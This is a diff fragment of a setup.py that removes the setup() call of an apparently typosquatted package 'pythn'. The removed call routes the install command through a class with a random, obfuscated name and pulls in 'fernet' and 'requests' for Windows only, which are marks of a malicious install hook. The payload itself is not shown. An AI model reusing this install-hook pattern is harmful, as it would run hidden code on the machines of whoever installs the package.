@@ -18,22 +18,5 @@ class MiIdDdmXXKYUHkFQBuNSXRtMOLeGnZwPxjwUEXNvrOUOrcgTjTfnLbiijHGbHqpBsYnjmOLmwl
             install.run(self)
 
 
-setup(
-    name="pythn",
-    version=VERSION,
-    author="MYmnCye",
-    author_email="RBDSK@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': MiIdDdmXXKYUHkFQBuNSXRtMOLeGnZwPxjwUEXNvrOUOrcgTjTfnLbiijHGbHqpBsYnjmOLmwlXTGRUEpQtbXeJZuUWIthZTjzuGnmhLPOTJcdrxJ,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
 
